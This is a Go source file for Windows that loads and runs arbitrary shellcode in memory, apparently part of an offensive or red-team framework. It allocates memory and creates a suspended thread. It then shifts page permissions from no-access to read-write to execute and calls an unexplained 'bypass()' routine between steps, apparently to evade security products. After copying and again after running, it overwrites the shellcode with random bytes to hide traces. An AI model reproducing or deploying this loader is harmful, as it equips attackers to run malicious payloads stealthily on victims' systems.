// +build windows

package shellcode

import (
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/module/windows/api"
	"project/internal/random"
	"project/internal/security"
)

const memType = windows.MEM_COMMIT | windows.MEM_RESERVE

// Execute is used to execute shellcode, default method is VirtualProtect.
// It will block until thread is exit.
// [Warning]: shellcode slice will be covered.
func Execute(method string, shellcode []byte) error {
	defer security.CoverBytes(shellcode)
	switch method {
	case "", MethodVirtualProtect:
		return VirtualProtect(shellcode)
	case MethodCreateThread:
		return CreateThread(shellcode)
	default:
		return errors.Errorf("unknown method: %s", method)
	}
}

// VirtualProtect is used to use virtual protect to execute shellcode,
// it will block until shellcode exit, if the shellcode will cover it self,
// use CreateThread to replace it.
func VirtualProtect(shellcode []byte) error {
	l := len(shellcode)
	if l == 0 {
		return errors.New("empty data")
	}
	size := uintptr(l)
	// allocate memory for shellcode
	memAddr, err := api.VirtualAlloc(0, size, memType, windows.PAGE_NOACCESS)
	if err != nil {
		return err
	}
	// create thread first and suspend
	bypass()
	hThread, _, err := api.CreateThread(nil, 0, memAddr, nil, windows.CREATE_SUSPENDED)
	if err != nil {
		return err
	}
	var threadHandleClosed bool
	defer func() {
		if !threadHandleClosed {
			api.CloseHandle(hThread)
		}
	}()
	// set read write and copy shellcode
	bypass()
	old := new(uint32)
	err = api.VirtualProtect(memAddr, size, windows.PAGE_READWRITE, old)
	if err != nil {
		return err
	}
	copyShellcode(memAddr, shellcode)
	// set execute
	bypass()
	err = api.VirtualProtect(memAddr, size, windows.PAGE_EXECUTE, old)
	if err != nil {
		return err
	}
	// resume thread for execute shellcode
	bypass()
	_, err = windows.ResumeThread(hThread)
	if err != nil {
		return errors.Wrap(err, "failed to resume thread")
	}
	// wait execute finish
	bypass()
	_, err = windows.WaitForSingleObject(hThread, windows.INFINITE)
	if err != nil {
		return errors.Wrap(err, "failed to wait thread")
	}
	// close thread handle at once
	api.CloseHandle(hThread)
	threadHandleClosed = true
	// set read write for clean shellcode
	bypass()
	err = api.VirtualProtect(memAddr, size, windows.PAGE_READWRITE, old)
	if err != nil {
		return err
	}
	return cleanShellcode(memAddr, size)
}

// CreateThread is used to create thread to execute shellcode.
// it will block until shellcode exit, so usually need create
// a goroutine to execute CreateThread.
func CreateThread(shellcode []byte) error {
	l := len(shellcode)
	if l == 0 {
		return errors.New("empty data")
	}
	size := uintptr(l)
	// allocate memory and copy shellcode
	bypass()
	memAddr, err := api.VirtualAlloc(0, size, memType, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return err
	}
	// create thread first and suspend
	bypass()
	hThread, _, err := api.CreateThread(nil, 0, memAddr, nil, windows.CREATE_SUSPENDED)
	if err != nil {
		return err
	}
	var threadHandleClosed bool
	defer func() {
		if !threadHandleClosed {
			api.CloseHandle(hThread)
		}
	}()
	copyShellcode(memAddr, shellcode)
	// resume thread for execute shellcode
	bypass()
	_, err = windows.ResumeThread(hThread)
	if err != nil {
		return errors.Wrap(err, "failed to resume thread")
	}
	// wait execute finish
	bypass()
	_, err = windows.WaitForSingleObject(hThread, windows.INFINITE)
	if err != nil {
		return errors.Wrap(err, "failed to wait thread")
	}
	// close thread handle at once
	api.CloseHandle(hThread)
	threadHandleClosed = true
	return cleanShellcode(memAddr, size)
}

// copyShellcode is used to copy shellcode to memory. It will not
// call bypass when copy large shellcode for prevent block.
func copyShellcode(memAddr uintptr, shellcode []byte) {
	bypass()
	rand := random.NewRand()
	count := 0
	total := 0
	for i := 0; i < len(shellcode); i++ {
		if total < maxBypassTimes {
			if count > criticalValue {
				bypass()
				count = 0
				total++
			} else {
				count++
			}
		}
		// set shellcode
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
		*b = shellcode[i]
		// clean shellcode at once
		shellcode[i] = byte(rand.Int64())
	}
}

// cleanShellcode is used to clean shellcode and free allocated memory.
func cleanShellcode(memAddr uintptr, size uintptr) error {
	bypass()
	rand := random.NewRand()
	for i := uintptr(0); i < size; i++ {
		b := (*byte)(unsafe.Pointer(memAddr + i)) // #nosec
		*b = byte(rand.Int64())
	}
	return api.VirtualFree(memAddr, 0, windows.MEM_RELEASE)
}
